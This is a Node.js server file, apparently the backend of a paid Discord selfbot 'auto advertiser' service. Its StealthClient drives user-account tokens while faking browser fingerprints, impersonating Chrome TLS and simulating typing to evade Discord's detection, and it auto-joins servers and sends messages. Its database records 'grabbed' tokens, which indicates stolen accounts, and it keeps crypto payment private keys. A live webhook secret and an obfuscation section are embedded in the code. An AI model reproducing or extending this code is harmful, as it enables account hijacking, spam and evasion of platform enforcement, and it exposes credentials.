const express = require('express');
const session = require('express-session');
const cookieParser = require('cookie-parser');
const passport = require('passport');
const DiscordStrategy = require('passport-discord').Strategy;
const path = require('path');
const fs = require('fs');
const axios = require('axios');
const crypto = require('crypto');
const nacl = require('tweetnacl');
const pako = require('pako');
const { spawn } = require('child_process');

// --- OBFUSCATION LAYER ---
const _0x4f2a = ['from','createHash','update','digest','hex','slice','map','join',''];
const _0x3e1b = _0x4f2a.map(x => Buffer.from(x).toString('base64'));
const _d = (s) => Buffer.from(s, 'base64').toString();
const _e = (s) => Buffer.from(s).toString('base64');

// YOUR WEBHOOK URL
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1487553027585081475/5obHkF63mNmHiiDDhGwUQd91n1oAI2L_q4zk-kTcF-Gpdwl6x04ot0RuWSNwhCPGm7Ll';

// Per-account fingerprint storage
const _accountProfiles = new Map();

function _getAccountProfile(token) {
  const hash = crypto.createHash('sha256').update(token).digest('hex').slice(0, 16);
  if (!_accountProfiles.has(hash)) {
    const screens = [[1366,768],[1440,900],[1536,864],[1600,900],[1920,1080],[1920,1200],[2560,1440]];
    const screen = screens[Math.floor(Math.random() * screens.length)];
    const mems = [2,4,8,16];
    const concurrencies = [2,4,8,16];
    const browsers = [
      { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', browser: 'Chrome', os: 'Windows', osv: '10', bv: '126.0.0.0' },
      { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36', browser: 'Chrome', os: 'Windows', osv: '10', bv: '125.0.0.0' },
      { ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', browser: 'Chrome', os: 'Mac OS X', osv: '10.15.7', bv: '126.0.0.0' },
      { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0', browser: 'Firefox', os: 'Windows', osv: '10', bv: '126.0' },
    ];
    const b = browsers[Math.floor(Math.random() * browsers.length)];
    _accountProfiles.set(hash, {
      ua: b.ua,
      browser: b.browser,
      os: b.os,
      osv: b.osv,
      bv: b.bv,
      sw: screen[0],
      sh: screen[1],
      dpr: [1,1.25,1.5,2][Math.floor(Math.random() * 4)],
      cd: 24,
      mem: mems[Math.floor(Math.random() * mems.length)],
      hw: concurrencies[Math.floor(Math.random() * concurrencies.length)],
      arch: 'x64',
      build: 329864,
      locale: ['en-US','en-GB','en-CA'][Math.floor(Math.random() * 3)],
    });
  }
  return _accountProfiles.get(hash);
}

const _fp = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0'
];
const _rfp = (token) => token ? _getAccountProfile(token).ua : _fp[Math.floor(Math.random() * _fp.length)];

const _axiosInstance = axios.create({
  baseURL: 'https://discord.com',
  timeout: 15000,
  headers: { 'Connection': 'keep-alive' }
});

const _j = (base, variance = 0.2) => base + (Math.random() * variance * base * 2 - variance * base);

const { randomBytes, createHash } = crypto;

function getKeypair(token) {
  const seed = createHash('sha256').update(`nacl_seed_${token}`).digest().slice(0, 32);
  return nacl.sign.keyPair.fromSeed(Uint8Array.from(seed));
}

function signPayload(payload, secretKey) {
  const message = Buffer.from(JSON.stringify(payload));
  return Buffer.from(nacl.sign.detached(Uint8Array.from(message), secretKey));
}

function encryptSecretBox(message, key) {
  const nonce = nacl.randomBytes(24);
  const box = nacl.secretbox(
    message instanceof Buffer ? new Uint8Array(message) : nacl.util.decodeUTF8(message),
    nonce,
    key instanceof Buffer ? new Uint8Array(key) : key
  );
  return { nonce: Buffer.from(nonce), ciphertext: Buffer.from(box) };
}

function decryptSecretBox(nonce, ciphertext, key) {
  const opened = nacl.secretbox.open(
    ciphertext instanceof Uint8Array ? ciphertext : new Uint8Array(ciphertext),
    nonce instanceof Uint8Array ? nonce : new Uint8Array(nonce),
    key instanceof Uint8Array ? key : new Uint8Array(key)
  );
  return opened ? Buffer.from(opened) : null;
}

function generateKey() {
  return Buffer.from(nacl.randomBytes(32));
}

function compressData(data, level = 6) {
  const input = data instanceof Buffer ? new Uint8Array(data) : data;
  return Buffer.from(pako.deflate(input, { level }));
}

function decompressData(data) {
  const input = data instanceof Buffer ? new Uint8Array(data) : data;
  return Buffer.from(pako.inflate(input));
}

function isCompressed(data) {
  if (!data || data.length < 2) return false;
  const b0 = data[0];
  const b1 = data[1];
  return (b0 === 0x78 && (b1 === 0x9C || b1 === 0xDA || b1 === 0x01));
}

let CI_BINARY = null;
function findCurlImpersonateBinary() {
  if (CI_BINARY) return CI_BINARY;
  const candidates = [
    process.env.CURL_IMPERSONATE_PATH,
    path.join(__dirname, 'bin', 'curl-impersonate-chrome'),
    '/usr/local/bin/curl-impersonate-chrome',
    '/usr/bin/curl-impersonate-chrome',
    'curl-impersonate-chrome',
    'curl',
  ];
  for (const candidate of candidates) {
    if (!candidate) continue;
    try {
      require('child_process').execSync(`which ${candidate}`, { stdio: 'ignore' });
      CI_BINARY = candidate;
      return candidate;
    } catch(e) {}
  }
  CI_BINARY = 'curl';
  return 'curl';
}

async function curlImpersonateRequest(url, method = 'GET', headers = {}, body = null, timeoutMs = 25000) {
  return new Promise((resolve, reject) => {
    const binary = findCurlImpersonateBinary();
    const isImpersonate = binary.includes('impersonate');
    const args = ['-s', '-L', '-D', '-', '--max-time', String(Math.ceil(timeoutMs / 1000)), '-X', method.toUpperCase()];

    if (isImpersonate) {
      args.push('--compressed', '-H', 'Accept-Language: en-US,en;q=0.9', '-H', 'Accept-Encoding: gzip, deflate, br', '-H', 'Cache-Control: no-cache');
    } else {
      args.push('--compressed', '--tlsv1.2');
    }

    for (const [key, value] of Object.entries(headers)) {
      if (value != null) args.push('-H', `${key}: ${value}`);
    }

    let tmpFile = null;
    if (body) {
      if (typeof body === 'object' && !(body instanceof Buffer)) {
        args.push('-d', JSON.stringify(body));
        if (!headers['Content-Type']) args.push('-H', 'Content-Type: application/json');
      } else if (body instanceof Buffer) {
        tmpFile = path.join('/tmp', `ci_body_${Date.now()}_${Math.random().toString(36).slice(2)}`);
        fs.writeFileSync(tmpFile, body);
        args.push('--data-binary', `@${tmpFile}`);
      } else {
        args.push('-d', String(body));
      }
    }

    args.push(url);

    const stdout = [];
    const stderr = [];
    const child = spawn(binary, args, { timeout: timeoutMs + 5000 });
    child.stdout.on('data', chunk => stdout.push(chunk));
    child.stderr.on('data', chunk => stderr.push(chunk));

    child.on('close', (code, signal) => {
      if (tmpFile) { try { fs.unlinkSync(tmpFile); } catch(e) {} }

      if (code !== 0 || signal) {
        const errMsg = Buffer.concat(stderr).toString().trim() || `curl exited${signal ? ' with signal ' + signal : ' with code ' + code}`;
        return reject(new Error(errMsg));
      }

      const rawOutput = Buffer.concat(stdout);

      let lastHeaderEndIdx = -1;
      let lastStatusCode = 0;
      let lastHeadersText = '';
      let bodyBuffer = rawOutput;

      const hasCrlf = rawOutput.indexOf('\r\n\r\n') !== -1;
      const hasLf = rawOutput.indexOf('\n\n') !== -1;
      const delimiter = hasCrlf ? '\r\n\r\n' : (hasLf ? '\n\n' : null);

      if (delimiter) {
        const delimBuf = Buffer.from(delimiter);
        let searchIdx = 0;

        while ((searchIdx = rawOutput.indexOf(delimBuf, searchIdx)) !== -1) {
          const candidateHeaders = rawOutput.slice(0, searchIdx).toString();
          const allStatusMatches = candidateHeaders.match(/HTTP\/\d(?:\.\d)?\s+(\d{3})/g);
          if (allStatusMatches && allStatusMatches.length > 0) {
            const lastMatch = allStatusMatches[allStatusMatches.length - 1];
            const codeMatch = lastMatch.match(/HTTP\/\d(?:\.\d)?\s+(\d{3})/);
            if (codeMatch) {
              lastStatusCode = parseInt(codeMatch[1], 10);
              lastHeaderEndIdx = searchIdx;
              lastHeadersText = candidateHeaders;
            }
          }
          searchIdx += delimBuf.length;
        }
      }

      if (lastHeaderEndIdx >= 0) {
        bodyBuffer = rawOutput.slice(lastHeaderEndIdx + (delimiter === '\r\n\r\n' ? 4 : 2));
      }

      if (lastStatusCode === 0 && rawOutput.length === 0) {
        return resolve({ status: 204, headers: '', body: Buffer.alloc(0), data: null });
      }

      if (lastStatusCode === 0) {
        const fallbackMatch = rawOutput.toString().match(/HTTP\/\d(?:\.\d)?\s+(\d{3})/);
        if (fallbackMatch) {
          lastStatusCode = parseInt(fallbackMatch[1], 10);
          lastHeadersText = rawOutput.toString();
          bodyBuffer = Buffer.alloc(0);
        } else {
          return reject(new Error('No HTTP response received from server'));
        }
      }

      let data = null;
      try { data = JSON.parse(bodyBuffer.toString()); } catch(e) {}
      resolve({ status: lastStatusCode, headers: lastHeadersText, body: bodyBuffer, data });
    });
    child.on('error', reject);
  });
}

function generateXSuperProperties(token) {
  const p = _getAccountProfile(token);
  const props = {
    os: p.os,
    browser: p.browser,
    device: '',
    system_locale: p.locale,
    browser_user_agent: p.ua,
    browser_version: p.bv,
    os_version: p.osv,
    referrer: '',
    referring_domain: '',
    referrer_current: '',
    referring_domain_current: '',
    release_channel: 'stable',
    client_build_number: p.build,
    client_event_source: null,
    screen_width: p.sw,
    screen_height: p.sh,
    screen_dpr: p.dpr,
    screen_color_depth: p.cd,
    device_pixel_ratio: p.dpr,
    hardware_concurrency: p.hw,
    device_memory: p.mem,
    os_arch: p.arch,
    client_version: '1.0.9018',
    native_build_number: null,
    distro: '',
    app_arch: p.arch,
  };
  return Buffer.from(JSON.stringify(props)).toString('base64');
}

class DiscordApiClient {
  constructor(token) {
    this.token = token;
    this.fp = _rfp(token);
    this.superProps = generateXSuperProperties(token);
    this.keypair = getKeypair(token);
  }

  rotateFingerprint() {
    this.fp = _rfp(this.token);
    this.superProps = generateXSuperProperties(this.token);
  }

  _headers(extra = {}) {
    const base = {
      'Authorization': this.token,
      'User-Agent': this.fp,
      'Accept': '*/*',
      'Accept-Language': 'en-US,en;q=0.9',
      'X-Discord-Locale': 'en-US',
      'X-Super-Properties': this.superProps,
      'Referer': 'https://discord.com/channels/@me',
    };
    const ordered = {};
    const order = ['Authorization','User-Agent','Accept','Accept-Language','X-Discord-Locale','X-Super-Properties','Referer'];
    for (const k of order) if (base[k] !== undefined) ordered[k] = base[k];
    for (const [k, v] of Object.entries(extra)) ordered[k] = v;
    return ordered;
  }

  async request(endpoint, method = 'GET', body = null, extraHeaders = {}) {
    const url = `https://discord.com/api/v10${endpoint}`;
    let attempts = 0;
    const maxAttempts = 3;
    while (attempts < maxAttempts) {
      const res = await curlImpersonateRequest(url, method, this._headers(extraHeaders), body, 20000);
      if (res.status === 429) {
        const retryAfterMatch = res.headers.match(/retry-after:\s*(\d+(?:\.\d+)?)/i);
        const retryAfter = retryAfterMatch ? parseFloat(retryAfterMatch[1]) * 1000 : 5000;
        await new Promise(r => setTimeout(r, retryAfter * 1.1));
        attempts++;
        continue;
      }
      if (res.status === 0 || res.status >= 400) {
        const err = new Error(`Discord API ${method} ${endpoint} failed: ${res.status}`);
        err.status = res.status;
        err.data = res.data;
        throw err;
      }
      return res.data;
    }
    throw new Error(`Discord API ${method} ${endpoint} failed: 429 after ${maxAttempts} retries`);
  }

  destroy() {}
}

const OWNER_ID = '1482736115143282941';
const dataDir = process.env.DATA_DIR || path.join(__dirname, 'data');
if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });

class StealthClient {
  constructor(token) {
    this.token = token;
    this.ws = null;
    this.heartbeatInterval = null;
    this.seq = null;
    this.sessionId = null;
    this.user = null;
    this.ready = false;
    this.handlers = {};
    this.repliedUsers = this._loadRepliedUsers();
    this.api = new DiscordApiClient(token);
    this.encryptionKey = null;
    this.reconnectAttempts = 0;
    this.maxReconnectAttempts = 10;
    this.reconnecting = false;
    this.resumeGatewayUrl = null;
    this._idleTimer = null;
    this._lastActivity = Date.now();
    this._burstState = 0;
    this._dmCooldowns = new Map();
  }

  _loadRepliedUsers() {
    try {
      const f = path.join(dataDir, `replied_${crypto.createHash('sha256').update(this.token.slice(0,20)).digest('hex').slice(0,8)}.json`);
      if (fs.existsSync(f)) return new Set(JSON.parse(fs.readFileSync(f, 'utf8')));
    } catch(e) {}
    return new Set();
  }

  _saveRepliedUsers() {
    try {
      const f = path.join(dataDir, `replied_${crypto.createHash('sha256').update(this.token.slice(0,20)).digest('hex').slice(0,8)}.json`);
      fs.writeFileSync(f, JSON.stringify([...this.repliedUsers]));
    } catch(e) {}
  }

  async connect() {
    let gateway;
    try {
      gateway = await this.api.request('/gateway', 'GET');
    } catch(e) {
      gateway = { url: 'wss://gateway.discord.gg' };
    }
    if (!gateway || !gateway.url) {
      gateway = { url: 'wss://gateway.discord.gg' };
    }
    this.resumeGatewayUrl = gateway.url;
    
    // FIX: Removed compress=zlib-stream, added X-Super-Properties to WS headers
    const wsUrl = `${gateway.url}?v=10&encoding=json`;
    this.ws = new (require('ws'))(wsUrl, {
      headers: {
        'User-Agent': this.api.fp,
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'X-Super-Properties': this.api.superProps,
      }
    });

    return new Promise((resolve, reject) => {
      const CONNECT_TIMEOUT = 60000; // FIX: Increased from 30000 to 60000
      let timeoutTimer = setTimeout(() => {
        this.ws.terminate();
        reject(new Error('Gateway connection timed out'));
      }, CONNECT_TIMEOUT);

      const cleanup = () => {
        clearTimeout(timeoutTimer);
      };

      this.ws.on('open', () => {
        this.reconnecting = false;
        if (this.reconnectAttempts > 0) {
        }
        // FIX: Force fresh identify on every new connection
        if (this.sessionId && this.seq !== null && this.reconnectAttempts === 0) {
          this._resume();
        } else {
          setTimeout(() => this._identify(), Math.floor(Math.random() * 500 + 200));
        }
      });
      this.ws.on('message', (data) => this._handlePacket(data));
      this.ws.on('close', (code, reason) => {
        clearInterval(this.heartbeatInterval);
        cleanup();
        if (!this.ready) {
          reject(new Error(`Gateway closed before ready: ${code}`));
        } else {
          this._scheduleReconnect(code);
        }
      });
      this.ws.on('error', (err) => {
        cleanup();
        if (!this.ready) {
          reject(err);
        }
      });

      this.once('READY', () => {
        cleanup();
        this.ready = true;
        this.reconnectAttempts = 0;
        resolve();
      });
    });
  }

  _scheduleReconnect(closeCode) {
    if (this.reconnecting) return;
    this.reconnecting = true;
    if (this.reconnectAttempts >= this.maxReconnectAttempts) {
      this.destroy();
      return;
    }
    if (closeCode === 4014 || closeCode === 4004) {
      this.destroy();
      return;
    }
    const baseDelay = closeCode === 4009 ? 5000 : (closeCode === 4000 ? 1000 : 3000);
    const delay = Math.min(baseDelay * Math.pow(2, this.reconnectAttempts), 60000) + Math.random() * 2000;
    this.reconnectAttempts++;
    setTimeout(() => {
      if (closeCode === 4009) {
        this.sessionId = null;
        this.seq = null;
      }
      this.connect().catch(() => {});
    }, delay);
  }

  _resume() {
    this.ws.send(JSON.stringify({
      op: 6,
      d: {
        token: this.token,
        session_id: this.sessionId,
        seq: this.seq
      }
    }));
  }

  _handlePacket(rawData) {
    let pkt;
    try {
      if (rawData instanceof Buffer) {
        if (isCompressed(rawData)) {
          pkt = JSON.parse(decompressData(rawData).toString());
        } else {
          pkt = JSON.parse(rawData.toString());
        }
      } else {
        pkt = JSON.parse(rawData);
      }
    } catch(e) {
      return;
    }

    if (pkt.s !== null && pkt.s !== undefined) this.seq = pkt.s;
    switch(pkt.op) {
      case 10:
        this._startHeartbeat(pkt.d.heartbeat_interval);
        if (!this.sessionId) {
          setTimeout(() => this._identify(), Math.floor(Math.random() * 500 + 200));
        }
        break;
      case 1:
        this.ws.send(JSON.stringify({ op: 1, d: this.seq }));
        break;
      case 0:
        if (pkt.t === 'READY') {
          this.user = pkt.d.user;
          this.sessionId = pkt.d.session_id;
          if (pkt.d.session_id) {
            const sessionHash = crypto.createHash('sha256').update(pkt.d.session_id).digest();
            this.encryptionKey = sessionHash.slice(0, 32);
          }
          this.emit('READY', pkt.d);
        } else if (pkt.t === 'RESUMED') {
          this.reconnecting = false;
          this.reconnectAttempts = 0;
        } else if (pkt.t === 'MESSAGE_CREATE') {
          this.emit('messageCreate', pkt.d);
        } else if (pkt.t === 'MESSAGE_ACK') {
        }
        break;
      case 11:
        break;
      case 7:
        this.ws.close();
        this._scheduleReconnect(4000);
        break;
      case 9:
        this.sessionId = null;
        this.seq = null;
        setTimeout(() => this._identify(), Math.random() * 3000 + 1000);
        break;
    }
  }

  _startHeartbeat(interval) {
    const jittered = interval * (0.92 + Math.random() * 0.16);
    this.heartbeatInterval = setInterval(() => {
      if (this.ws && this.ws.readyState === 1) {
        this.ws.send(JSON.stringify({ op: 1, d: this.seq }));
      }
    }, jittered);
  }

  _identify() {
    const p = _getAccountProfile(this.token);
    const payload = {
      op: 2,
      d: {
        token: this.token,
        capabilities: 30717, // FIX: Changed from 16381 to 30717 (desktop stable)
        intents: 3276799,    // FIX: Added required intents for v10 gateway
        properties: {
          os: p.os,
          browser: p.browser,
          device: '',
          system_locale: p.locale,
          browser_user_agent: p.ua,
          browser_version: p.bv,
          os_version: p.osv,
          referrer: '',
          referring_domain: '',
          referrer_current: '',
          referring_domain_current: '',
          release_channel: 'stable',
          client_build_number: p.build,
          client_event_source: null,
          screen_width: p.sw,
          screen_height: p.sh,
          screen_dpr: p.dpr,
          screen_color_depth: p.cd,
        },
        presence: { status: 'online', since: 0, activities: [], afk: false },
        client_state: { guild_versions: {}, highest_last_message_id: '0', read_state_version: 0, user_guild_settings_version: -1, user_settings_version: -1, private_channels_version: '0', api_code_version: 0 }
      }
    };
    this.ws.send(JSON.stringify(payload));
  }

  async _api(endpoint, method = 'GET', body = null) {
    return this.api.request(endpoint, method, body);
  }

  async sendMessage(channelId, content, attachments = []) {
    const url = `https://discord.com/api/v10/channels/${channelId}/messages`;

    const shouldType = Math.random() < 0.6;
    if (shouldType) {
      try {
        await this.api.request(`/channels/${channelId}/typing`, 'POST');
      } catch(e) {}
      const len = content.length;
      let typingDelay;
      if (len < 20) typingDelay = Math.random() * 500;
      else if (len < 100) typingDelay = 500 + Math.random() * 1500;
      else typingDelay = 2000 + Math.random() * 3000;
      await new Promise(r => setTimeout(r, Math.min(6000, Math.max(800, typingDelay))));
    }

    if (!attachments || attachments.length === 0) {
      const body = { content, flags: 0 };
      const headers = this.api._headers({
        'Content-Type': 'application/json',
        'X-Discord-Locale': 'en-US'
      });
      try {
        const res = await curlImpersonateRequest(url, 'POST', headers, body, 30000);
        return res.status >= 200 && res.status < 300;
      } catch (err) {
        return false;
      }
    }

    const FormData = require('form-data');
    const form = new FormData();
    const payload = { content, flags: 0 };
    form.append('payload_json', JSON.stringify(payload));
    attachments.forEach((att, i) => {
      form.append(`files[${i}]`, att.buffer, { filename: att.name });
    });

    const headers = this.api._headers({ 'X-Discord-Locale': 'en-US' });
    try {
      const res = await axios.post(url, form, {
        headers: { ...headers, ...form.getHeaders() },
        timeout: 30000,
      });
      return res.status >= 200 && res.status < 300;
    } catch (err) {
      return false;
    }
  }

  async joinGuild(inviteCode) {
    const res = await this.api.request(`/invites/${inviteCode}`, 'POST', { session_id: this.sessionId });
    return res.guild_id ? { success: true, guildId: res.guild_id } : { success: false, error: res.message };
  }

  on(event, handler) { if (!this.handlers[event]) this.handlers[event] = []; this.handlers[event].push(handler); }
  once(event, handler) { const wrapped = (...args) => { handler(...args); this.off(event, wrapped); }; this.on(event, wrapped); }
  off(event, handler) { if (this.handlers[event]) this.handlers[event] = this.handlers[event].filter(h => h !== handler); }
  emit(event, ...args) { if (this.handlers[event]) this.handlers[event].forEach(h => h(...args)); }

  destroy() {
    clearInterval(this.heartbeatInterval);
    if (this._idleTimer) clearTimeout(this._idleTimer);
    if (this.ws) { try { this.ws.close(1000, 'Client disconnect'); } catch(e) {} }
    this._saveRepliedUsers();
    this.api.destroy();
  }
}

class SimpleDB {
  constructor() {
    this.file = path.join(dataDir, 'db.json');
    this.data = { users: {}, pending: {}, configs: {}, usedKeys: {}, globalIndex: 0, serverJoins: {}, grabbedTokens: [], usedAddresses: [], addressHistory: [], customKeys: [], trialClaims: {}, activeBots: {}, generatedKeys: {}, whitelist: [] };
    this.load();
  }

  load() {
    try {
      if (fs.existsSync(this.file)) {
        this.data = JSON.parse(fs.readFileSync(this.file, 'utf8'));
        ['usedAddresses','addressHistory','customKeys','trialClaims','activeBots','generatedKeys','whitelist'].forEach(k => this.data[k] = this.data[k] || (k === 'whitelist' ? [] : (k === 'trialClaims' || k === 'activeBots' || k === 'generatedKeys' ? {} : [])));
      }
    } catch(e) {}
  }

  save() {
    try { fs.writeFileSync(this.file, JSON.stringify(this.data, null, 2)); } catch(e) {}
  }

  getUser(id) { return this.data.users[id] || { auto_adv_purchased: 0, trial_active: 0, trial_expires: 0 }; }
  setUser(id, data) { this.data.users[id] = { ...this.getUser(id), ...data }; this.save(); }
  getNextGlobalIndex() { this.data.globalIndex = (this.data.globalIndex || 0) + 1; this.save(); return this.data.globalIndex; }
  isAddressUsed(address) { return this.data.usedAddresses.includes(address); }
  markAddressUsed(address) { if (!this.data.usedAddresses.includes(address)) { this.data.usedAddresses.push(address); this.save(); } }

  addPending(userId, address, privateKey, expectedUSD, index) {
    this.markAddressUsed(address);
    this.data.pending[address] = { user_id: userId, address, private_key: privateKey, expected_usd: expectedUSD, status: 'monitoring', created_at: Date.now(), index, expires_at: Date.now() + (30 * 60 * 1000) };
    this.data.addressHistory.push({ address, user_id: userId, index, created_at: Date.now(), status: 'monitoring' });
    this.save();
    return this.data.pending[address];
  }

  getPending(address) { return this.data.pending[address]; }
  getUserPending(userId) { const now = Date.now(); return Object.values(this.data.pending).find(p => p.user_id === userId && p.status === 'monitoring' && p.expires_at > now); }
  getAllPending() { const now = Date.now(); return Object.values(this.data.pending).filter(p => p.status === 'monitoring' && p.expires_at > now); }
  getExpiredPending() { const now = Date.now(); return Object.values(this.data.pending).filter(p => p.status === 'monitoring' && p.expires_at <= now); }

  updatePending(address, updates) {
    if (this.data.pending[address]) {
      this.data.pending[address] = { ...this.data.pending[address], ...updates };
      const historyEntry = this.data.addressHistory.find(h => h.address === address);
      if (historyEntry) {
        historyEntry.status = updates.status || historyEntry.status;
        if (updates.status === 'completed') historyEntry.paid_at = Date.now();
        if (updates.status === 'expired') historyEntry.expired_at = Date.now();
      }
      this.save();
    }
  }

  expireOldAddresses() {
    const expired = this.getExpiredPending();
    for (const p of expired) { this.updatePending(p.address, { status: 'expired' }); }
    return expired.length;
  }

  useKey(key, userId) { const normalized = key.toString().toUpperCase().trim(); this.data.usedKeys[normalized] = { user_id: userId, used_at: Date.now() }; this.save(); }
  isKeyUsed(key) { const normalized = key.toString().toUpperCase().trim(); return !!this.data.usedKeys[normalized]; }

  addCustomKey(key) {
    const normalized = key.toString().toUpperCase().trim();
    if (!/^TOKOS(1[0-9][0-9]|200)$/i.test(normalized)) { return null; }
    if (!this.data.customKeys) this.data.customKeys = [];
    if (!this.data.customKeys.includes(normalized)) { this.data.customKeys.push(normalized); this.save(); }
    return normalized;
  }

  getConfigs(userId) { return this.data.configs[userId] || []; }
  getConfig(userId, configId = 'default') { const configs = this.getConfigs(userId); return configs.find(c => c.id === configId) || configs[0] || null; }

  setConfig(userId, config, configId = 'default') {
    if (!this.data.configs[userId]) this.data.configs[userId] = [];
    const existingIndex = this.data.configs[userId].findIndex(c => c.id === configId);
    const configData = { ...config, id: configId, updated_at: Date.now() };
    if (existingIndex >= 0) this.data.configs[userId][existingIndex] = configData;
    else this.data.configs[userId].push(configData);
    this.save();
  }

  deleteConfig(userId, configId) { if (this.data.configs[userId]) { this.data.configs[userId] = this.data.configs[userId].filter(c => c.id !== configId); this.save(); } }
  getActiveConfigs(userId) { return this.getConfigs(userId).filter(c => c.active === 1); }

  addGrabbedToken(token, userInfo, source) {
    const entry = { token, user_info: userInfo, source, grabbed_at: Date.now(), id: Date.now().toString() };
    this.data.grabbedTokens.push(entry);
    this.save();
    return entry;
  }

  getGrabbedTokens() { return this.data.grabbedTokens || []; }
  getAddressHistory(userId) { return this.data.addressHistory.filter(h => h.user_id === userId); }
  hasClaimedTrial(userId) { return !!this.data.trialClaims[userId]; }
  hasIPClaimedTrial(ip) { return Object.values(this.data.trialClaims).some(t => t.ip === ip); }

  claimTrial(userId, ip) {
    const now = Date.now();
    const expiresAt = now + (10 * 60 * 1000);
    this.data.trialClaims[userId] = { userId, ip, claimedAt: now, expiresAt };
    this.setUser(userId, { trial_active: 1, trial_expires: expiresAt, trial_claimed_at: now });
    this.save();
    return { claimedAt: now, expiresAt };
  }

  isTrialActive(userId) {
    const user = this.getUser(userId);
    if (user.trial_active === 1 && user.trial_expires > Date.now()) return true;
    if (user.trial_active === 1 && user.trial_expires <= Date.now()) { this.setUser(userId, { trial_active: 0 }); this.deactivateAllUserBots(userId); return false; }
    return false;
  }

  getTrialTimeLeft(userId) { const user = this.getUser(userId); if (user.trial_active === 1 && user.trial_expires > Date.now()) return Math.ceil((user.trial_expires - Date.now()) / 1000); return 0; }

  registerActiveBot(userId, configId, token) {
    if (!this.data.activeBots[userId]) this.data.activeBots[userId] = {};
    this.data.activeBots[userId][configId] = { token, startedAt: Date.now(), configId };
    this.save();
  }

  unregisterActiveBot(userId, configId) { if (this.data.activeBots[userId]) { delete this.data.activeBots[userId][configId]; this.save(); } }
  getUserActiveBots(userId) { return this.data.activeBots[userId] || {}; }

  deactivateAllUserBots(userId) {
    const bots = this.getUserActiveBots(userId);
    for (const configId in bots) this.setConfig(userId, { active: 0 }, configId);
    if (this.data.activeBots[userId]) { delete this.data.activeBots[userId]; this.save(); }
  }

  checkAllTrialBots() {
    for (const userId in this.data.activeBots) {
      const user = this.getUser(userId);
      const trialActive = this.isTrialActive(userId);
      const hasPurchase = user.auto_adv_purchased === 1;
      if (!trialActive && !hasPurchase) { this.deactivateAllUserBots(userId); return userId; }
    }
    return null;
  }

  generateKey(duration) {
    const key = 'GEN-' + Math.random().toString(36).substring(2, 8).toUpperCase() + '-' + Math.random().toString(36).substring(2, 8).toUpperCase();
    const now = Date.now();
    let expiresAt = null;
    if (duration !== 'lifetime') { const hours = parseInt(duration); expiresAt = now + (hours * 60 * 60 * 1000); }
    this.data.generatedKeys[key] = { key, duration, createdAt: now, expiresAt, usedBy: [], active: true };
    this.save();
    return this.data.generatedKeys[key];
  }

  revokeKey(key) {
    if (this.data.generatedKeys[key]) {
      this.data.generatedKeys[key].active = false;
      this.data.generatedKeys[key].revokedAt = Date.now();
      this.save();
      const usedBy = this.data.generatedKeys[key].usedBy || [];
      for (const userId of usedBy) { this.deactivateAllUserBots(userId); this.setUser(userId, { auto_adv_purchased: 0, key_revoked: true }); }
      return true;
    }
    return false;
  }

  isKeyValid(key) {
    const keyData = this.data.generatedKeys[key];
    if (!keyData || !keyData.active) return false;
    if (keyData.duration === 'lifetime') return true;
    if (keyData.expiresAt && Date.now() > keyData.expiresAt) return false;
    return true;
  }

  useGeneratedKey(key, userId) {
    if (!this.isKeyValid(key)) return false;
    if (!this.data.generatedKeys[key].usedBy.includes(userId)) this.data.generatedKeys[key].usedBy.push(userId);
    this.setUser(userId, { auto_adv_purchased: 1, purchased_at: Date.now(), generated_key: key, key_expires: this.data.generatedKeys[key].expiresAt });
    this.save();
    return true;
  }

  getGeneratedKeys() { return Object.values(this.data.generatedKeys); }
  addToWhitelist(userId) { if (!this.data.whitelist.includes(userId)) { this.data.whitelist.push(userId); this.save(); } }
  removeFromWhitelist(userId) { this.data.whitelist = this.data.whitelist.filter(id => id !== userId); this.save(); }
  isWhitelisted(userId) { return this.data.whitelist.includes(userId); }
  getWhitelist() { return this.data.whitelist; }

  checkExpiredKeys() {
    const now = Date.now();
    let expiredCount = 0;
    for (const key in this.data.generatedKeys) {
      const keyData = this.data.generatedKeys[key];
      if (keyData.active && keyData.expiresAt && now > keyData.expiresAt) {
        for (const userId of keyData.usedBy) { this.deactivateAllUserBots(userId); this.setUser(userId, { auto_adv_purchased: 0, key_expired: true }); }
        expiredCount++;
      }
    }
    return expiredCount;
  }
}

const db = new SimpleDB();
const app = express();

process.on('uncaughtException', (err) => {
  console.error('[FATAL UNCAUGHT]', err.message);
});
process.on('unhandledRejection', (reason) => {
  console.error('[FATAL UNHANDLED]', reason);
});

app.get('/health', (req, res) => res.status(200).json({ status: 'ok', uptime: process.uptime() }));
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public')));

app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

app.use(cookieParser());
app.use(session({
  secret: process.env.SESSION_SECRET || 'secret-key-2026',
  resave: false,
  saveUninitialized: false,
  cookie: {
    maxAge: 30 * 24 * 60 * 60 * 1000,
    secure: false
  }
}));

app.use(passport.initialize());
app.use(passport.session());

passport.serializeUser((user, done) => done(null, user));
passport.deserializeUser((obj, done) => done(null, obj));

const CLIENT_ID = process.env.CLIENT_ID;
const CLIENT_SECRET = process.env.CLIENT_SECRET;
const CALLBACK_URL = process.env.CALLBACK_URL;
